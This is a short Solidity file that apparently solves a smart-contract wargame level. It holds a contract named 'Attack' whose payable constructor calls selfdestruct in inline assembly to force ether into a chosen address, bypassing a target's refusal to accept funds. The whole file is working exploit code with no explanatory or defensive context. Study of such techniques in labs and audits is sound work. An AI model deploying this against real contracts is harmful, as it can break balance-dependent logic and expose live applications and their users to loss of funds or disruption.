// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attack {
    constructor(address _dest) payable {
        assembly {
            selfdestruct(_dest)
        }
    }
}